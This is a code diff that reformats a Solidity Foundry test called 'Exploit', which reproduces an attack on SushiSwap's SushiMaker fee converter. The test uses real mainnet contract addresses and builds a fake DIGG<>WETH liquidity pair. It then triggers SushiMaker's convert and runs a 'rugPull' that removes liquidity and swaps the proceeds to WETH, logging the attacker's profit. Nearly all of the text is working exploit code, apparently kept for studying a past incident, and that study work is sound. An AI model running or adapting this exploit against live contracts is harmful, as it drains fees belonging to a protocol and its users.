@@ -22,18 +22,13 @@ fee is sent to SushiMaker by SushiSwapPair's burn (from Router::removeLiquidity)
 IUniswapV2Factory(factory).feeTo() == SushiMaker, check here: https://etherscan.io/address/0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac#readContract*/
 
 contract Exploit is Test {
-    IUniswapV2Router02 private constant sushiRouter =
-        IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
-    IUniswapV2Factory private constant sushiFactory =
-        IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
-    IWETH private constant WETH =
-        IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IERC20 private constant wethBridgeToken =
-        IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599); // WBTC
-    IERC20 private constant nonWethBridgeToken =
-        IERC20(0x798D1bE841a82a273720CE31c822C61a67a601C3); // DIGG
-    ISushiMaker private constant sushiMaker =
-        ISushiMaker(0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50);
+
+    IUniswapV2Router02 private constant sushiRouter = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
+    IUniswapV2Factory private constant sushiFactory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
+    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IERC20 private constant wethBridgeToken = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599); // WBTC
+    IERC20 private constant nonWethBridgeToken = IERC20(0x798D1bE841a82a273720CE31c822C61a67a601C3); // DIGG
+    ISushiMaker private constant sushiMaker = ISushiMaker(0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50);
 
     IUniswapV2Pair private wethPair; // Fake Pair Digg<>WETH
 
@@ -44,24 +39,14 @@ contract Exploit is Test {
         wethPair = IUniswapV2Pair(address(FakePair));
 
         vm.prank(tx.origin);
-        sushiMaker.convert(
-            address(wethBridgeToken),
-            address(nonWethBridgeToken)
-        );
+        sushiMaker.convert(address(wethBridgeToken), address(nonWethBridgeToken));
 
         rugPull();
 
-        console.log(
-            "Attacker's profit: %s WETH",
-            WETH.balanceOf(address(this)) / 1e18
-        );
+        console.log("Attacker's profit: %s WETH", WETH.balanceOf(address(this)) / 1e18);
     }
 
-    function createAndProvideLiquidity()
-        public
-        payable
-        returns (IUniswapV2Pair pair)
-    {
+    function createAndProvideLiquidity() public payable returns (IUniswapV2Pair pair) {
         // first acquire both tokens for vulnerable pair
         // we assume one token of the pair has a WETH pair
         // deposit all ETH for WETH
@@ -72,19 +57,12 @@ contract Exploit is Test {
         path[0] = address(WETH);
         path[1] = address(wethBridgeToken);
         path[2] = address(nonWethBridgeToken);
-        uint256[] memory swapAmounts = sushiRouter.swapExactTokensForTokens(
-            0.001 ether / 2,
-            0,
-            path,
-            address(this),
-            type(uint256).max
-        );
+        uint256[] memory swapAmounts =
+            sushiRouter.swapExactTokensForTokens(0.001 ether / 2, 0, path, address(this), type(uint256).max);
         uint256 nonWethBridgeAmount = swapAmounts[2];
 
         // create DIGG<>WETH
-        pair = IUniswapV2Pair(
-            sushiFactory.createPair(address(nonWethBridgeToken), address(WETH))
-        );
+        pair = IUniswapV2Pair(sushiFactory.createPair(address(nonWethBridgeToken), address(WETH)));
 
         // add liquidity
         nonWethBridgeToken.approve(address(sushiRouter), nonWethBridgeAmount);
@@ -109,13 +87,7 @@ contract Exploit is Test {
         uint256 lpToWithdraw = wethPair.balanceOf(address(this));
         wethPair.approve(address(sushiRouter), lpToWithdraw);
         sushiRouter.removeLiquidity(
-            address(WETH),
-            address(otherToken),
-            lpToWithdraw,
-            0,
-            0,
-            address(this),
-            type(uint256).max
+            address(WETH), address(otherToken), lpToWithdraw, 0, 0, address(this), type(uint256).max
         );
 
         // trade otherToken -> wethBridgeToken -> WETH
@@ -126,39 +98,35 @@ contract Exploit is Test {
         path[1] = address(wethBridgeToken);
         path[2] = address(WETH);
 
-        sushiRouter.swapExactTokensForTokens(
-            otherTokenBalance,
-            0,
-            path,
-            address(this),
-            type(uint256).max
-        );
+        sushiRouter.swapExactTokensForTokens(otherTokenBalance, 0, path, address(this), type(uint256).max);
     }
 
     receive() external payable {}
+
 }
 
 /* -------------------- Interface -------------------- */
 interface IERC20 {
+
     function transfer(address to, uint256 amount) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
 }
 
 interface IWETH {
+
     function deposit() external payable;
     function transfer(address to, uint256 value) external returns (bool);
     function approve(address guy, uint256 wad) external returns (bool);
     function withdraw(uint256 wad) external;
     function balanceOf(address) external view returns (uint256);
+
 }
 
 interface IUniswapV2Router02 {
+
     function swapExactTokensForTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -187,31 +155,30 @@ interface IUniswapV2Router02 {
         address to,
         uint256 deadline
     ) external returns (uint256 amountA, uint256 amountB);
+
 }
 
 interface IUniswapV2Pair {
+
     function approve(address spender, uint256 amount) external returns (bool);
     function balanceOf(address) external view returns (uint256);
     function skim(address to) external;
     function sync() external;
-    function swap(
-        uint256 amount0Out,
-        uint256 amount1Out,
-        address to,
-        bytes memory data
-    ) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
 
     function token0() external view returns (address);
     function token1() external view returns (address);
+
 }
 
 interface IUniswapV2Factory {
-    function createPair(
-        address tokenA,
-        address tokenB
-    ) external returns (address pair);
+
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+
 }
 
 interface ISushiMaker {
+
     function convert(address x, address y) external view returns (uint256);
+
 }
